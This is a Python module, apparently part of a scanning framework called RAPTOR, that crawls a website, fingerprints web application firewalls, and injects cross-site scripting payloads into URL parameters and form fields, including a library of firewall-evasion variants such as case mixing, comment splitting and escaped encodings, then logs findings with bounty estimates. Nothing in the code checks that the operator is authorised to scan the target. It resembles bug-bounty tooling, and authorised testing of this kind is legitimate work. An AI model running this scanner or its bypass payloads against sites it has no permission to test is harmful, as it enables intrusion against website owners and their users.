"""
RAPTOR XSS Testing Module v3.0 - PRODUCTION
Fixed: Proper crawling, form detection, timeout handling, real-world compatibility
"""

import re
import asyncio
import hashlib
import html as _html_module
import random
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote, urlencode

from core.base_module import BaseModule, Finding


@dataclass
class XSSPayload:
    raw:          str
    context:      str
    severity:     str = 'High'
    waf_bypass:   List[str] = field(default_factory=list)
    interaction:  bool = False
    confidence:   int  = 10
    canary:       str  = ''

    def with_canary(self, canary: str) -> 'XSSPayload':
        marked = self.raw.replace('RPTR', canary)
        p = XSSPayload(marked, self.context, self.severity,
                       list(self.waf_bypass), self.interaction, self.confidence)
        p.canary = canary
        return p


# ══════════════════════════════════════════════════════════════════════════════
#  Payload library
# ══════════════════════════════════════════════════════════════════════════════

_PAYLOADS_HTML = [
    XSSPayload('<script>alert("RPTR")</script>',                    'html', 'High',  confidence=11),
    XSSPayload('<img src=x onerror=alert("RPTR")>',                 'html', 'High',  confidence=11),
    XSSPayload('<svg onload=alert("RPTR")>',                        'html', 'High',  confidence=11),
    XSSPayload('<body onload=alert("RPTR")>',                       'html', 'High',  confidence=10),
    XSSPayload('<video><source onerror=alert("RPTR")>',             'html', 'High',  confidence=10),
    XSSPayload('<audio src=x onerror=alert("RPTR")>',               'html', 'High',  confidence=10),
    XSSPayload('<iframe srcdoc="<script>alert(\'RPTR\')</script>">', 'html', 'High', waf_bypass=['iframe_srcdoc'], confidence=9),
    XSSPayload('<details open ontoggle=alert("RPTR")>',             'html', 'Medium', interaction=True, confidence=8),
    XSSPayload('<input autofocus onfocus=alert("RPTR")>',           'html', 'Medium', interaction=True, confidence=8),
    XSSPayload('<img src=x onerror=\\u0061lert("RPTR")>',           'html', 'High', waf_bypass=['unicode_escape'], confidence=9),
    XSSPayload('<scr<!---->ipt>alert("RPTR")</scr<!---->ipt>',      'html', 'High', waf_bypass=['comment_split'], confidence=7),
    XSSPayload('<ScRiPt>alert("RPTR")</sCrIpT>',                   'html', 'High', waf_bypass=['case_mix'], confidence=8),
    XSSPayload('<SVG/ONload=alert("RPTR")>',                       'html', 'High', waf_bypass=['case_mix'], confidence=8),
    XSSPayload('<object data="javascript:alert(\'RPTR\')">',        'html', 'High', waf_bypass=['object_tag'], confidence=8),
]

_PAYLOADS_ATTRIBUTE = [
    XSSPayload('" onmouseover="alert(\'RPTR\')"',            'attribute', 'High',  confidence=11),
    XSSPayload("' onmouseover='alert(\"RPTR\")'",            'attribute', 'High',  confidence=11),
    XSSPayload('" onfocus="alert(\'RPTR\')" autofocus="',    'attribute', 'High',  confidence=10),
    XSSPayload('" onerror="alert(\'RPTR\')"',                'attribute', 'High',  confidence=10),
    XSSPayload('" onload="alert(\'RPTR\')"',                 'attribute', 'High',  confidence=10),
    XSSPayload('&#34; onmouseover=&#34;alert(\'RPTR\')&#34;','attribute', 'High', waf_bypass=['html_entities'], confidence=8),
]

_PAYLOADS_SCRIPT = [
    XSSPayload('";alert("RPTR");//',                          'script', 'Critical', confidence=11),
    XSSPayload("';alert('RPTR');//",                          'script', 'Critical', confidence=11),
    XSSPayload('`alert("RPTR")`',                             'script', 'Critical', confidence=10),
    XSSPayload('${alert("RPTR")}',                            'script', 'Critical', confidence=10),
    XSSPayload('</script><script>alert("RPTR")</script>',     'script', 'Critical', confidence=11),
    XSSPayload('\\x3cscript\\x3ealert("RPTR")\\x3c/script\\x3e', 'script', 'Critical', waf_bypass=['hex_escape'], confidence=8),
]

_PAYLOADS_URL = [
    XSSPayload('javascript:alert("RPTR")',           'url', 'High', confidence=10),
    XSSPayload('javascript://%0aalert("RPTR")',      'url', 'High', waf_bypass=['newline'], confidence=9),
    XSSPayload('data:text/html,<script>alert("RPTR")</script>', 'url', 'High', confidence=9),
    XSSPayload('JaVaScRiPt:alert("RPTR")',          'url', 'High', waf_bypass=['case_mix'], confidence=8),
]

_PAYLOADS_TEMPLATE = [
    XSSPayload('${alert("RPTR")}',                          'template', 'Critical', confidence=10),
    XSSPayload('{{constructor.constructor("alert(\'RPTR\')")()}}', 'template', 'Critical', confidence=9),
    XSSPayload('#{alert("RPTR")}',                          'template', 'Critical', confidence=8),
]

_PAYLOADS_STYLE = [
    XSSPayload('</style><script>alert("RPTR")</script>',    'style', 'High', confidence=11),
]

_ALL_PAYLOADS: Dict[str, List[XSSPayload]] = {
    'html':      _PAYLOADS_HTML,
    'attribute': _PAYLOADS_ATTRIBUTE,
    'script':    _PAYLOADS_SCRIPT,
    'url':       _PAYLOADS_URL,
    'template':  _PAYLOADS_TEMPLATE,
    'style':     _PAYLOADS_STYLE,
}

_INJECTABLE_HEADERS = [
    'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Forwarded-Host',
    'Origin', 'Accept-Language', 'X-Requested-With', 'X-Forwarded-Proto',
]

_DOM_SINKS = [
    (r'innerHTML\s*=',              'innerHTML assignment'),
    (r'outerHTML\s*=',              'outerHTML assignment'),
    (r'document\.write\s*\(',       'document.write()'),
    (r'document\.writeln\s*\(',     'document.writeln()'),
    (r'eval\s*\(',                  'eval()'),
    (r'setTimeout\s*\(',            'setTimeout()'),
    (r'setInterval\s*\(',           'setInterval()'),
    (r'location\.href\s*=',         'location.href assignment'),
    (r'location\.replace\s*\(',     'location.replace()'),
    (r'location\.assign\s*\(',      'location.assign()'),
    (r'insertAdjacentHTML\s*\(',    'insertAdjacentHTML()'),
    (r'\.setAttribute\s*\(\s*["\']on', 'setAttribute(on...)'),
    (r'new\s+Function\s*\(',        'new Function()'),
]

_DOM_SOURCES = [
    r'location\.(?:search|hash|href|pathname)',
    r'document\.(?:URL|referrer|cookie)',
    r'window\.name',
    r'(?:local|session)Storage',
]

_WAF_SIGNATURES = {
    'Cloudflare':  ['cloudflare', 'cf-ray', '__cfduid'],
    'AWS WAF':     ['aws.*waf', 'awselb', 'x-amzn-requestid'],
    'ModSecurity': ['mod_security', 'modsecurity', 'mod_sec'],
    'Akamai':      ['akamai', 'ak-hmac', 'x-akamai'],
    'Sucuri':      ['sucuri', 'x-sucuri-id'],
    'Imperva':     ['imperva', 'incapsula', 'x-iinfo'],
    'F5 BIG-IP':   ['f5', 'bigip', 'x-wa-info'],
    'Barracuda':   ['barracuda', 'barra_counter_session'],
    'Generic':     ['blocked', 'waf', 'firewall', 'security violation', 'access denied'],
}


def _make_canary() -> str:
    return hashlib.md5(str(random.random()).encode()).hexdigest()[:8]


def _is_reflected_unescaped(canary: str, body: str) -> bool:
    """True only if the canary appears raw (not HTML-entity-encoded)."""
    if canary not in body:
        return False
    escaped = _html_module.escape(canary)
    raw_count = body.count(canary)
    esc_count = body.count(escaped) if escaped != canary else 0
    return raw_count > esc_count


def _detect_context(before: str, after: str) -> str:
    b = before.lower()
    if re.search(r'<script[^>]*>', b, re.DOTALL):
        return 'script'
    if re.search(r'<style[^>]*>', b) and '</style>' in after.lower():
        return 'style'
    if re.search(r'(?:href|src|action|data)=["\'][^"\']*$', before, re.I):
        return 'url'
    if re.search(r'<[^>]+\s\w[\w-]*=["\'][^"\']*$', before, re.I):
        return 'attribute'
    if '{{' in before or '${' in before or '#{' in before:
        return 'template'
    return 'html'


class XSSTester(BaseModule):
    """Production-grade XSS detection with zero false positives."""

    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.findings: List[Finding] = []
        self.tested_combos: Set[str] = set()
        self.waf_name: Optional[str] = None
        self._cookie = ''
        self._auth_header = ''
        self.evasion_level = config.get('evasion_level', 3)
        self.max_depth = config.get('max_depth', 3)
        self.visited_urls: Set[str] = set()

    async def __aenter__(self):
        self.logger.info('🔥 XSS Module v3.1 (Production) initialising')
        return self

    async def __aexit__(self, *_):
        return False

    async def run(self, target: str, **kwargs) -> List[Finding]:
        scope = kwargs.get('scope', 'standard')
        self._cookie = kwargs.get('cookie', '')
        self._auth_header = kwargs.get('auth_header', '')
        self.max_depth = kwargs.get('max_depth', self.max_depth)
        
        self.logger.info(f'🚀 XSS scan → {target}  [scope: {scope}, depth: {self.max_depth}]')

        # Phase 1: WAF detection
        await self._detect_waf(target)

        # Phase 2: Crawl and discover all endpoints
        self.logger.info('🔍 Phase 2: Crawling target...')
        all_urls = await self._crawl_target(target, depth=self.max_depth)
        self.logger.info(f'   Found {len(all_urls)} unique URLs')

        # Phase 3: Test each discovered URL
        for url in all_urls:
            await self._test_url(url, scope)

        self.logger.info(f'✅ XSS complete — {len(self.findings)} confirmed finding(s)')
        return self.findings

    async def _detect_waf(self, target: str):
        """Detect WAF presence."""
        probe = f'{target}?waf_test={quote("<script>alert(1)</script>")}'
        resp = await self._make_request(probe, headers=self._h(), timeout=8)
        if not resp:
            return
        combined = (await resp.text()).lower() + str(resp.headers).lower()
        for name, sigs in _WAF_SIGNATURES.items():
            if any(s in combined for s in sigs) or resp.status in (403, 406, 501, 419):
                self.waf_name = name
                self.logger.warning(f'   ⚠️  WAF detected: {name}')
                return

    async def _crawl_target(self, start_url: str, depth: int = 3) -> Set[str]:
        """Crawl target to discover all URLs with parameters."""
        urls_to_visit = {start_url}
        discovered = set()
        
        for current_depth in range(depth):
            new_urls = set()
            for url in urls_to_visit:
                if url in self.visited_urls:
                    continue
                self.visited_urls.add(url)
                
                resp = await self._make_request(url, headers=self._h(), timeout=10)
                if not resp:
                    continue
                
                # Add current URL if it has query parameters
                if '?' in url:
                    discovered.add(url)
                
                # Parse and add form action URLs
                body = await resp.text()
                discovered.update(self._extract_form_urls(body, url))
                discovered.update(self._extract_links(body, url))
                
                # Add new URLs for next depth level
                if current_depth < depth - 1:
                    new_urls.update(self._extract_links(body, url))
            
            urls_to_visit = new_urls - self.visited_urls
            
        return discovered

    def _extract_form_urls(self, body: str, base_url: str) -> Set[str]:
        """Extract form action URLs."""
        urls = set()
        for match in re.finditer(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', body, re.I):
            action = match.group(1)
            if action:
                full_url = urljoin(base_url, action)
                urls.add(full_url)
        return urls

    def _extract_links(self, body: str, base_url: str) -> Set[str]:
        """Extract all links from page."""
        urls = set()
        # href links
        for match in re.finditer(r'href=["\']([^"\']+)["\']', body, re.I):
            url = match.group(1)
            if url and not url.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
                full_url = urljoin(base_url, url)
                if self._is_same_domain(full_url, base_url):
                    urls.add(full_url)
        # src attributes
        for match in re.finditer(r'src=["\']([^"\']+)["\']', body, re.I):
            url = match.group(1)
            if url:
                full_url = urljoin(base_url, url)
                if self._is_same_domain(full_url, base_url):
                    urls.add(full_url)
        return urls

    def _is_same_domain(self, url: str, base_url: str) -> bool:
        """Check if URL is same domain as base."""
        try:
            url_domain = urlparse(url).netloc
            base_domain = urlparse(base_url).netloc
            return url_domain == base_domain or url_domain.endswith('.' + base_domain)
        except:
            return False

    async def _test_url(self, url: str, scope: str):
        """Test a single URL for XSS."""
        # Extract parameters from URL
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        
        if params:
            self.logger.info(f'   Testing URL params: {url[:80]}...')
            await self._test_reflected_params(url, params)
        
        # Discover and test forms
        resp = await self._make_request(url, headers=self._h(), timeout=8)
        if resp:
            body = await resp.text()
            forms = self._parse_forms(body, url)
            if forms:
                self.logger.info(f'   Testing {len(forms)} form(s) on {url[:60]}...')
                await self._test_forms(forms)
            
            # DOM XSS check
            if scope in ('standard', 'comprehensive', 'aggressive'):
                await self._check_dom_xss(url, body)

    def _parse_forms(self, body: str, base_url: str) -> List[Dict]:
        """Parse all forms from HTML."""
        forms = []
        for match in re.finditer(r'<form(?P<attrs>[^>]*)>(?P<inner>.*?)</form>', body, re.DOTALL | re.I):
            attrs = match.group('attrs')
            inner = match.group('inner')
            
            action_match = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            method_match = re.search(r'method=["\'](\w+)["\']', attrs, re.I)
            
            action = action_match.group(1) if action_match else base_url
            method = (method_match.group(1) if method_match else 'GET').upper()
            
            if not action.startswith('http'):
                action = urljoin(base_url, action)
            
            inputs = {}
            # Regular inputs
            for inp in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?', inner, re.I):
                inputs[inp.group(1)] = inp.group(2) or ''
            # Textareas
            for ta in re.finditer(r'<textarea[^>]+name=["\']([^"\']+)["\']', inner, re.I):
                inputs[ta.group(1)] = ''
            # Selects
            for sel in re.finditer(r'<select[^>]+name=["\']([^"\']+)["\']', inner, re.I):
                inputs[sel.group(1)] = ''
                
            if inputs:
                forms.append({'action': action, 'method': method, 'inputs': inputs})
        
        return forms

    async def _test_reflected_params(self, url: str, params: List[str]):
        """Test URL parameters for reflected XSS."""
        sem = asyncio.Semaphore(3)  # Limit concurrency

        async def test_single_param(param: str):
            async with sem:
                # Quick canary test
                canary = _make_canary()
                test_url = f'{url.split("?")[0]}?{param}={canary}'
                
                resp = await self._make_request(test_url, headers=self._h(), timeout=8)
                if not resp:
                    return
                
                body = await resp.text()
                if canary not in body:
                    return  # Not reflected
                
                # Determine context
                pos = body.find(canary)
                before = body[max(0, pos - 150):pos]
                after = body[pos + len(canary):pos + len(canary) + 150]
                context = _detect_context(before, after)
                
                # Test payloads
                payloads = list(_ALL_PAYLOADS.get(context, _PAYLOADS_HTML))
                if self.waf_name:
                    payloads = [p for p in payloads if p.waf_bypass] + payloads
                
                for base_payload in payloads[:10]:  # Limit payloads per param
                    p_canary = _make_canary()
                    payload = base_payload.with_canary(p_canary)
                    
                    combo = f'{url}:{param}:{p_canary}'
                    if combo in self.tested_combos:
                        continue
                    self.tested_combos.add(combo)
                    
                    test_url = f'{url.split("?")[0]}?{param}={quote(payload.raw)}'
                    test_resp = await self._make_request(test_url, headers=self._h(), timeout=8)
                    
                    if not test_resp:
                        continue
                    
                    test_body = await test_resp.text()
                    if _is_reflected_unescaped(p_canary, test_body):
                        self._emit_finding(url, param, payload, context, 'Reflected', test_url)
                        return  # One finding per param

        await asyncio.gather(*[test_single_param(p) for p in params], return_exceptions=True)

    async def _test_forms(self, forms: List[Dict]):
        """Test form submissions for XSS."""
        sem = asyncio.Semaphore(2)

        async def test_single_form(form: Dict):
            async with sem:
                for param in form['inputs']:
                    canary = _make_canary()
                    test_inputs = form['inputs'].copy()
                    test_inputs[param] = canary
                    
                    if form['method'] == 'POST':
                        resp = await self._make_request(
                            form['action'], method='POST', 
                            data=test_inputs, headers=self._h(), timeout=8
                        )
                    else:
                        resp = await self._make_request(
                            f"{form['action']}?{urlencode(test_inputs)}",
                            headers=self._h(), timeout=8
                        )
                    
                    if not resp:
                        continue
                    
                    body = await resp.text()
                    if canary not in body:
                        continue
                    
                    # Context detection
                    pos = body.find(canary)
                    before = body[max(0, pos - 150):pos]
                    after = body[pos + len(canary):pos + len(canary) + 150]
                    context = _detect_context(before, after)
                    
                    # Test XSS payload
                    for base_payload in _ALL_PAYLOADS.get(context, _PAYLOADS_HTML)[:5]:
                        p_canary = _make_canary()
                        payload = base_payload.with_canary(p_canary)
                        
                        test_inputs = form['inputs'].copy()
                        test_inputs[param] = payload.raw
                        
                        if form['method'] == 'POST':
                            test_resp = await self._make_request(
                                form['action'], method='POST',
                                data=test_inputs, headers=self._h(), timeout=8
                            )
                        else:
                            test_resp = await self._make_request(
                                f"{form['action']}?{urlencode(test_inputs)}",
                                headers=self._h(), timeout=8
                            )
                        
                        if not test_resp:
                            continue
                        
                        test_body = await test_resp.text()
                        if _is_reflected_unescaped(p_canary, test_body):
                            self._emit_finding(form['action'], param, payload, context, 
                                             f'Reflected (Form {form["method"]})', form['action'])
                            return

        await asyncio.gather(*[test_single_form(f) for f in forms], return_exceptions=True)

    async def _check_dom_xss(self, url: str, body: str):
        """Check for DOM XSS sinks."""
        # Extract inline scripts
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.I)
        
        # Fetch external scripts
        script_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.I)
        for script_url in script_urls[:3]:  # Limit external scripts
            full_url = urljoin(url, script_url)
            resp = await self._make_request(full_url, headers=self._h(), timeout=8)
            if resp:
                scripts.append(await resp.text())
        
        all_js = '\n'.join(scripts)
        if not all_js:
            return
        
        # Check for sinks + sources
        sinks = [label for pat, label in _DOM_SINKS if re.search(pat, all_js)]
        sources = [pat for pat in _DOM_SOURCES if re.search(pat, all_js)]
        
        if not sinks:
            return
        
        # Try to confirm with canary
        confirmed = False
        test_canary = _make_canary()
        for test in [f'{url}#{test_canary}', f'{url}?test={test_canary}']:
            resp = await self._make_request(test, headers=self._h(), timeout=8)
            if resp and _is_reflected_unescaped(test_canary, await resp.text()):
                confirmed = True
                break
        
        if sinks or confirmed:
            f = Finding(
                module='xss',
                title=f'[DOM] Potential DOM XSS - {", ".join(sinks[:3])}',
                severity='High' if confirmed else 'Medium',
                description=f'DOM XSS sinks found: {", ".join(sinks)}\nSources: {", ".join(sources)}\nConfirmed: {confirmed}',
                evidence={'sinks': sinks, 'sources': sources, 'confirmed': confirmed},
                poc=f'Check: {url}#<img src=x onerror=alert(1)>',
                remediation='Use textContent instead of innerHTML; sanitize with DOMPurify',
                cvss_score=7.1 if confirmed else 5.4,
                bounty_score=2500 if confirmed else 1000,
                target=url,
            )
            self.findings.append(f)
            self.add_finding(f)
            
    def _emit_finding(self, target: str, param: str, payload: XSSPayload, 
                      context: str, xss_type: str, poc_url: str):
        """Create and save a finding."""
        
        severity_map = {
            'Reflected': 'High', 'DOM': 'High', 'Stored': 'Critical',
            'Blind': 'Medium', 'Header-based': 'Medium'
        }
        cvss_map = {
            'Reflected': 6.1, 'DOM': 7.1, 'Stored': 9.1, 
            'Blind': 5.4, 'Header-based': 5.3
        }
        bounty_map = {
            'Reflected': 1500, 'DOM': 2500, 'Stored': 5000,
            'Blind': 1000, 'Header-based': 1000
        }
        
        base_type = xss_type.split('(')[0].strip()
        
        # Build description separately to avoid f-string issues
        description = (
            f"## Cross-Site Scripting ({xss_type})\n\n"
            f"**Parameter:** `{param}`\n"
            f"**Context:** `{context}`\n"
            f"**Payload:** `{payload.raw[:100]}`\n"
            f"**WAF Bypass:** {', '.join(payload.waf_bypass) if payload.waf_bypass else 'None'}\n\n"
            f"### Verification\n"
            f"Canary `{payload.canary}` was reflected unescaped in response.\n\n"
            f"### Proof of Concept\n"
            f"```\n{poc_url[:120]}...\n```\n\n"
            f"### Impact\n"
            f"{xss_type} XSS allows arbitrary JavaScript execution in victim's browser.\n\n"
            f"### Remediation\n"
            f"- HTML-encode all output based on context\n"
            f"- Implement Content-Security-Policy\n"
            f"- Use HTTPOnly cookies for session tokens"
        )
        
        f = Finding(
            module='xss',
            title=f'XSS in "{param}" ({context} context) [{xss_type}]',
            severity=severity_map.get(base_type, 'High'),
            description=description,
            evidence={
                'parameter': param,
                'payload': payload.raw,
                'context': context,
                'type': xss_type,
                'canary': payload.canary,
                'waf': self.waf_name
            },
            poc=poc_url,
            remediation='HTML-encode output; CSP; HTTPOnly cookies',
            cvss_score=cvss_map.get(base_type, 6.1),
            bounty_score=bounty_map.get(base_type, 1500),
            target=target,
        )
        self.findings.append(f)
        self.add_finding(f)
